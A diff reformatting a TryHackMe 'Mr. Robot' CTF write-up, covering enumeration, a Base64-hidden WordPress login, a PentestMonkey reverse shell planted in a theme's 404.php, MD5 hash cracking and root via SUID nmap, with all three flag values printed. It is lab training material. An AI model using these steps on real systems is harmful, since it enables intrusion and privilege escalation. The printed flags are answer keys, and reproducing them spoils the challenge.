@@ -1,201 +1,197 @@
-Mr. Robot CTF — TryHackMe Writeup
+# 🤖 Mr. Robot CTF — TryHackMe Writeup
 
-Author: Obada
+![Difficulty](https://img.shields.io/badge/Difficulty-Medium-orange?style=flat-square)
+![Category](https://img.shields.io/badge/Category-Web%20%7C%20WordPress%20%7C%20Reverse%20Shell%20%7C%20Privesc-blue?style=flat-square)
+![Status](https://img.shields.io/badge/Status-Pwned-red?style=flat-square)
+![Author](https://img.shields.io/badge/Author-Obada%20Hamed-181717?style=flat-square)
 
-Difficulty: Medium
+> *A tribute to the Mr. Robot series — think like Elliot Alderson. Enumerate, exploit, escalate, and find all 3 keys.*
 
-Category: Enumeration, Web Exploitation, WordPress Abuse, Privilege Escalation
+---
 
+## 🗺️ Attack Path
 
-A tribute to the iconic Mr. Robot series, this CTF challenges you to think like Elliot Alderson: enumerate, exploit, escalate, and uncover the three hidden keys.
-
-1. Network Setup
-The initial tasks involve connecting to TryHackMe’s VPN using OpenVPN. Once connected, the machine becomes accessible via its internal IP.
-(No answers required for Task 1.)
-
-2. Enumeration
-🔍 Nmap Scan
-```Code
-nmap -sV -sC -oA nmap_output [Target_IP]
 ```
-Results:
-
-22/tcp – closed (SSH)
-
-80/tcp – open (Apache HTTP)
-
-443/tcp – open (Apache HTTPS)
-
-Since the machine uses a hostname internally, I added it to /etc/hosts:
-
-```Code
-[Target_IP]   mrrobot.thm
+Nmap → Gobuster → robots.txt (Key 1) → /license (Base64 creds)
+→ WordPress Admin → Reverse Shell (404.php) → Hash Crack → SSH
+→ SUID Nmap → Root Shell (Key 3)
 ```
-3. Directory Enumeration
-🧭 Gobuster
-```Code
+
+---
+
+## 1. Enumeration
+
+### Nmap Scan
+
+```bash
+nmap -sV -sC -oA nmap_output <target-ip>
+```
+
+| Port | Service |
+|------|---------|
+| 22 | SSH (closed) |
+| 80 | HTTP (Apache) |
+| 443 | HTTPS (Apache) |
+
+Added to `/etc/hosts`:
+```
+<target-ip>   mrrobot.thm
+```
+
+### Directory Enumeration
+
+```bash
 gobuster dir -u http://mrrobot.thm \
--w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
--t 100 -q -o gobuster_output.txt
+  -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt \
+  -t 100 -q -o gobuster_output.txt
 ```
-Key findings:
 
-/robots
+**Key findings:**
 
-/readme
+| Path | Notes |
+|------|-------|
+| `/robots` | Contains key-1 path + wordlist |
+| `/key-1-of-3.txt` | 🔑 Key 1 |
+| `/fsocity.dic` | Custom wordlist |
+| `/license` | Hidden credentials (Base64) |
+| `/wp-login` | WordPress login |
 
-/wp-login
+---
 
-/wp-admin
+## 2. Key 1
 
-/intro
-
-/license
-
-/fsocity.dic (important wordlist)
-
-/key-1-of-3.txt
-
-4. Key 1
-Visiting:
-
-```Code
+```
 http://mrrobot.thm/key-1-of-3.txt
 ```
-Key 1:  
-073403c8a58a1f80d943455fb30724b9
 
-5. Credential Discovery
-📁 fsocity.dic
-Downloaded using:
-
-```Code
-curl http://mrrobot.thm/fsocity.dic > dictionary.txt
 ```
-This is a custom wordlist used later for brute‑forcing.
+🔑 Key 1: 073403c8a58a1f80d943455fb30724b9
+```
 
-📄 license
-The /license page contained a Base64 string:
+---
 
-```Code
+## 3. Credential Discovery
+
+### /license (Base64)
+
+The `/license` page contained:
+```
 ZWxsaW90OkVSMjgtMDY1Mgo=
 ```
-Decoded via CyberChef →
-elliot : ER28-0652
 
-These are valid WordPress credentials.
-
-6. WordPress Access
-Login page:
-
-```Code
-http://mrrobot.thm/wp-login.php
+Decoded:
+```bash
+echo ZWxsaW90OkVSMjgtMDY1Mgo= | base64 -d
+# elliot:ER28-0652
 ```
-Using the credentials:
 
+---
+
+## 4. WordPress Exploitation
+
+Login at `http://mrrobot.thm/wp-login.php`:
+```
 Username: elliot
-
 Password: ER28-0652
-
-We gain access to the WordPress admin panel.
-
-7. Reverse Shell via Theme Editor
-WordPress allows file editing.
-I modified:
-
-```Code
-Appearance → Editor → 404.php
 ```
-Replaced its content with a PentestMonkey PHP reverse shell, updating:
 
-LHOST = my machine IP
+### Reverse Shell via Theme Editor
 
-LPORT = chosen port
+`Appearance → Editor → 404.php`
 
-Saved the file → “File edited successfully”.
+Replaced content with [PentestMonkey PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell), setting:
+- `LHOST` = attacker IP
+- `LPORT` = chosen port
 
-Listener
-```Code
-nc -lvnp [PORT]
-Trigger the shell
-Code
-http://mrrobot.thm/wp-includes/themes/twentyfifteen/404.php
+```bash
+# Listener
+nc -lvnp <PORT>
+
+# Trigger
+curl http://mrrobot.thm/wp-content/themes/twentyfifteen/404.php
 ```
-A reverse shell is obtained.
 
-Upgraded shell:
+✅ Reverse shell obtained.
 
-```Code
+Shell upgrade:
+```bash
 SHELL=/bin/bash script -q /dev/null
 ```
-8. Key 2
-The file /home/robot/key-2-of-3.txt is unreadable without proper permissions.
 
-But /home/robot/password.raw-md5 is readable:
+---
 
-```Code
-robot:c3fcd3d76192e4007dfb496cca67e13b
+## 5. Key 2
+
+```bash
+cat /home/robot/password.raw-md5
+# robot:c3fcd3d76192e4007dfb496cca67e13b
 ```
-Cracked using John:
 
-```Code
-echo "c3fcd3d76192e4007dfb496cca67e13b" > secret
-john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt secret
+Cracking with John:
+```bash
+echo "c3fcd3d76192e4007dfb496cca67e13b" > hash.txt
+john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+# Password: abcdefghijklmnopqrstuvwxyz
 ```
-Password found:
-abcdefghijklmnopqrstuvwxyz
 
-Switch user:
-
-```Code
+```bash
 su robot
-```
-Now read key 2:
-
-```Code
 cat /home/robot/key-2-of-3.txt
 ```
-Key 2:  
-822c73956184f694993bede3eb39f959
 
-9. Privilege Escalation
-Searching for SUID binaries:
-
-```Code
-find / -perm -4000 2>/dev/null
 ```
-A vulnerable version of nmap is present.
+🔑 Key 2: 822c73956184f694993bede3eb39f959
+```
 
-Exploit: Interactive Mode
-```Code
+---
+
+## 6. Privilege Escalation — SUID Nmap
+
+```bash
+find / -perm -4000 2>/dev/null
+# /usr/local/bin/nmap  ← vulnerable version
+```
+
+Nmap interactive mode exploit:
+```bash
 nmap --interactive
 !sh
 ```
-This spawns a root shell.
 
-10. Key 3
-```Code
+✅ Root shell obtained.
+
+---
+
+## 7. Key 3
+
+```bash
 cat /root/key-3-of-3.txt
 ```
-Key 3:  
-04787ddef27c3dee1ee161b21670b4e4
 
-11. Summary of Keys
-Key	Value
-Key 1	073403c8a58a1f80d943455fb30724b9
-Key 2	822c73956184f694993bede3eb39f959
-Key 3	04787ddef27c3dee1ee161b21670b4e4
-12. Final Thoughts
-This machine beautifully blends:
+```
+🔑 Key 3: 04787ddef27c3dee1ee161b21670b4e4
+```
 
-Web enumeration
+---
 
-WordPress exploitation
+## 📋 All Keys
 
-Credential cracking
+| Key | Value |
+|-----|-------|
+| Key 1 | `073403c8a58a1f80d943455fb30724b9` |
+| Key 2 | `822c73956184f694993bede3eb39f959` |
+| Key 3 | `04787ddef27c3dee1ee161b21670b4e4` |
 
-Reverse shell techniques
+---
 
-Privilege escalation via SUID binaries
+## 📋 Summary
 
-A perfect medium‑level challenge for sharpening real‑world pentesting skills.
+| Step | Technique | Tool |
+|------|-----------|------|
+| Recon | Port + directory scanning | Nmap, Gobuster |
+| Credential Discovery | Base64 decode in /license | CyberChef |
+| Initial Access | WordPress theme editor RCE | Burp Suite, nc |
+| Lateral Movement | MD5 hash cracking | John the Ripper |
+| Privilege Escalation | SUID nmap interactive mode | GTFOBins |
+
+> **Key lesson:** Always enumerate everything — `/license` and `/robots.txt` had the keys to the entire machine. WordPress theme editor is a powerful RCE vector when you have admin access.
